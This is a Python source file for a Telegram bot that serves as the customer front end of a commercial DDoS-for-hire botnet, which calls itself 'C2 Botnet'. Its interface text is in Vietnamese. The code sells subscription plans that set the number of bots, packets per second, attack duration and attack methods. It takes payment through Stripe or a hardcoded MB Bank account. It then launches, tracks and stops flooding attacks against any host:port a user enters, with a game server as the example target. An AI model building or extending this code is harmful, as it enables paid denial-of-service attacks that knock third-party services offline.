# Telegram Bot — Full C2 Control
# ============================================================
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from app.config import settings
from app.database import async_session
from app.models.all_models import User, UserSubscription, Plan, AttackTask, Bot, TelegramSession, Payment
from app.services.attack_service import AttackService
from app.services.bot_service import BotService
from app.schemas.all_schemas import AttackCreate
from app.mbbank import get_mb
from sqlalchemy import select
from datetime import datetime, timezone, timedelta
import uuid, asyncio

async def init_telegram():
    if not settings.TELEGRAM_BOT_TOKEN: return
    app = Application.builder().token(settings.TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("plans", cmd_plans))
    app.add_handler(CommandHandler("buy", cmd_buy))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("balance", cmd_balance))
    app.add_handler(CommandHandler("bots", cmd_bots))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await app.initialize(); await app.start(); await app.updater.start_polling()
    print("[Telegram] Bot started")

async def get_user(tid: int):
    async with async_session() as s:
        r = await s.execute(select(User).where(User.telegram_id == tid))
        return r.scalar_one_or_none()

async def get_user_plan(user: User):
    async with async_session() as s:
        r = await s.execute(select(UserSubscription).where(UserSubscription.user_id == user.id, UserSubscription.status == "active"))
        sub = r.scalar_one_or_none()
        if sub:
            r2 = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
            return sub, r2.scalar_one_or_none()
        return None, None

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tid = update.effective_user.id
    async with async_session() as s:
        user = await get_user(tid)
        if not user:
            user = User(username=f"tg_{tid}", telegram_id=tid, password_hash="telegram_only", role="user")
            s.add(user); await s.commit(); await s.refresh(user)
            s.add(TelegramSession(user_id=user.id, chat_id=update.effective_chat.id)); await s.commit()
            await update.message.reply_text("🎯 *C2 Botnet Control*\n\nTài khoản của bạn đã được liên kết.\n\n📋 */plans* — Xem gói cước\n💰 */buy* — Mua gói\n⚔️ */attack* — Tấn công\n🛑 */stop* — Dừng\n📊 */status* — Trạng thái\n🤖 */bots* — Bot online\n💵 */balance* — Số dư", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"👋 Chào {user.username}!\n\n📋 */plans* | ⚔️ */attack* | 💵 */balance*", parse_mode="Markdown")

async def cmd_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True)); plans = r.scalars().all()
    kb = []; text = "📋 *Gói cước:*\n\n"
    for p in plans:
        kb.append([InlineKeyboardButton(f"{p.name} — {p.price_vnd:,}đ/th (${p.price_usd})", callback_data=f"buy_{p.slug}")])
        text += f"*{p.name}* ({p.slug})\n├ Bot: {p.max_bots} | Concurrent: {p.max_concurrent}\n├ Duration: {p.max_attack_secs}s | Cooldown: {p.cooldown_secs}s\n├ PPS: {p.max_pps_per_bot:,}/bot\n├ Methods: {', '.join(p.allowed_methods)}\n└ {p.price_vnd:,}đ/th (${p.price_usd})\n\n"
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cmd_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user: await update.message.reply_text("Gõ /start trước."); return
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True)); plans = r.scalars().all()
    kb = []
    for p in plans: kb.append([InlineKeyboardButton(f"{p.name} — {p.price_vnd:,}đ", callback_data=f"buy_{p.slug}")])
    kb.append([InlineKeyboardButton("💳 Stripe (USD)", callback_data="pay_stripe")])
    kb.append([InlineKeyboardButton("🏦 MB Bank (VND - Tự động)", callback_data="pay_mbank")])
    await update.message.reply_text("💰 *Chọn gói & phương thức:*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user: await update.message.reply_text("Gõ /start trước."); return
    sub, plan = await get_user_plan(user)
    if not sub or not plan: await update.message.reply_text("❌ Chưa mua gói. /buy để mua."); return
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
        if not ts: ts = TelegramSession(user_id=user.id, chat_id=update.effective_chat.id); s.add(ts); await s.commit()
        ts.state = "setting_target"; ts.data = {"plan_id": str(plan.id)}; await s.commit()
    kb = []
    for m in plan.allowed_methods: kb.append([InlineKeyboardButton(m, callback_data=f"atk_method_{m}")])
    kb.append([InlineKeyboardButton("❌ Cancel", callback_data="atk_cancel")])
    await update.message.reply_text("⚔️ *Launch Attack*\n\nChọn method:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user: await update.message.reply_text("Gõ /start trước."); return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(AttackTask.user_id == user.id, AttackTask.status == "running"))
        tasks = r.scalars().all()
    if not tasks: await update.message.reply_text("Không có attack nào."); return
    for t in tasks: await AttackService.stop(t.id, user.id)
    await update.message.reply_text(f"🛑 Đã dừng {len(tasks)} attack.")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user: await update.message.reply_text("Gõ /start trước."); return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(AttackTask.user_id == user.id, AttackTask.status == "running"))
        tasks = r.scalars().all()
    if not tasks: await update.message.reply_text("📊 Không có attack nào."); return
    text = "📊 *Active Attacks:*\n\n"
    for t in tasks:
        elapsed = (datetime.now(timezone.utc) - t.started_at).total_seconds() if t.started_at else 0
        text += f"🎯 `{t.target_host}:{t.target_port}`\n├ Method: {t.method} | Elapsed: {int(elapsed)}s\n├ Packets: {t.total_packets:,}\n└ Bots: {len(t.bot_ids)}\n\n"
    await update.message.reply_text(text, parse_mode="Markdown")

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user: await update.message.reply_text("Gõ /start trước."); return
    sub, plan = await get_user_plan(user)
    await update.message.reply_text(f"💵 *Balance*\n\n├ Credit: ${float(user.credit_balance):.2f}\n├ Plan: {plan.name if plan else 'None'}\n└ Expires: {sub.expires_at.strftime('%d/%m/%Y') if sub and sub.expires_at else 'N/A'}", parse_mode="Markdown")

async def cmd_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = await BotService.count_online()
    await update.message.reply_text(f"🤖 *{count}* bots online.", parse_mode="Markdown")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎯 *C2 Botnet*\n\n*/start* | */plans* | */buy* | */attack* | */stop* | */status* | */balance* | */bots* | */help*", parse_mode="Markdown")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; data = query.data; await query.answer()
    user = await get_user(query.from_user.id)
    if not user: await query.edit_message_text("Session expired. /start"); return

    if data.startswith("buy_"):
        slug = data[4:]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug)); plan = r.scalar_one_or_none()
        if not plan: await query.edit_message_text("Plan not found."); return
        kb = [
            [InlineKeyboardButton(f"💳 Stripe — ${plan.price_usd}", callback_data=f"pay_{plan.slug}_stripe")],
            [InlineKeyboardButton(f"🏦 MB Bank — {plan.price_vnd:,}đ", callback_data=f"pay_{plan.slug}_mbank")],
            [InlineKeyboardButton("❌ Cancel", callback_data="pay_cancel")],
        ]
        await query.edit_message_text(f"🛒 *{plan.name}* — {plan.price_vnd:,}đ / ${plan.price_usd}\n\nChọn phương thức:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("pay_") and data.endswith("_stripe"):
        slug = data[4:-7]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug)); plan = r.scalar_one_or_none()
        if not plan: await query.edit_message_text("Plan not found."); return
        if settings.STRIPE_SECRET_KEY:
            import stripe
            stripe.api_key = settings.STRIPE_SECRET_KEY
            try:
                session = stripe.checkout.Session.create(payment_method_types=["card"], line_items=[{"price_data": {"currency": "usd", "product_data": {"name": f"C2 {plan.name}"}, "unit_amount": int(float(plan.price_usd) * 100)}, "quantity": 1}], mode="payment", success_url=f"{settings.DASHBOARD_URL}/payment/success", cancel_url=f"{settings.DASHBOARD_URL}/payment/cancel", metadata={"user_id": str(user.id), "plan_id": str(plan.id)})
                async with async_session() as s:
                    s.add(Payment(user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd, method="stripe", tx_ref=session.id, payment_url=session.url)); await s.commit()
                await query.edit_message_text(f"💳 [Click để thanh toán]({session.url})", parse_mode="Markdown")
            except Exception as e: await query.edit_message_text(f"Stripe error: {e}")
        else: await query.edit_message_text("Stripe chưa được cấu hình.")

    elif data.startswith("pay_") and data.endswith("_mbank"):
        slug = data[4:-6]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug)); plan = r.scalar_one_or_none()
        if not plan: await query.edit_message_text("Plan not found."); return
        tx_ref = f"C2-{uuid.uuid4().hex[:8].upper()}"
        async with async_session() as s:
            s.add(Payment(user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd, method="mbank", tx_ref=tx_ref, meta={"plan_id": str(plan.id), "plan_slug": plan.slug})); await s.commit()
        mb = await get_mb()
        mb_acc = mb.account_no if mb else "0974163549"
        await query.edit_message_text(f"🏦 *Thanh toán MB Bank*\n\n📦 Plan: *{plan.name}*\n💰 Số tiền: *{plan.price_vnd:,}đ*\n🏧 Ngân hàng: *MB Bank*\n📋 STK: `{mb_acc}`\n📝 Nội dung CK: `{tx_ref}`\n\n⚠️ Ghi đúng nội dung để hệ thống tự động kích hoạt.\n🆔 Mã GD: `{tx_ref}`", parse_mode="Markdown")

    elif data == "pay_cancel": await query.edit_message_text("Đã hủy.")
    elif data == "pay_stripe": await query.edit_message_text("Dùng /buy để chọn gói trước.")
    elif data == "pay_mbank": await query.edit_message_text("Dùng /buy để chọn gói trước.")

    elif data.startswith("atk_method_"):
        method = data[11:]
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts: ts.data = ts.data or {}; ts.data["method"] = method; ts.state = "setting_target"; await s.commit()
        await query.edit_message_text(f"⚔️ Method: *{method}*\n\nNhập target: `host:port duration`\nVD: `game-server.com:30120 120`", parse_mode="Markdown")
    elif data == "atk_cancel":
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts: ts.state = "idle"; ts.data = {}; await s.commit()
        await query.edit_message_text("Đã hủy.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user: return
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
    if not ts or ts.state != "setting_target": return
    text = update.message.text.strip(); parts = text.split()
    if len(parts) >= 2:
        host_port = parts[0]; duration = int(parts[1]) if len(parts) > 1 else 60
        host = host_port; port = 80
        if ":" in host_port: host, p = host_port.split(":", 1); port = int(p)
        method = ts.data.get("method", "UDP")
        sub, plan = await get_user_plan(user)
        if not sub or not plan: await update.message.reply_text("❌ Chưa có plan. /buy"); return
        if method not in plan.allowed_methods: await update.message.reply_text(f"❌ Method {method} không có trong plan."); return
        try:
            atk = AttackCreate(target_host=host, target_port=port, method=method, duration_secs=min(duration, plan.max_attack_secs), pps_per_bot=plan.max_pps_per_bot)
            task = await AttackService.launch(user, atk)
            await update.message.reply_text(f"✅ *Attack launched!*\n\n🎯 `{host}:{port}`\n├ Method: {method}\n├ Duration: {min(duration, plan.max_attack_secs)}s\n└ Bots: {len(task.bot_ids)}\n\n🛑 */stop* để dừng.", parse_mode="Markdown")
        except Exception as e: await update.message.reply_text(f"❌ {e}")
        ts.state = "idle"; ts.data = {}
        async with async_session() as s: await s.merge(ts); await s.commit()
    else: await update.message.reply_text("❌ Format: `host:port duration`\nVD: `game-server.com:30120 120`", parse_mode="Markdown")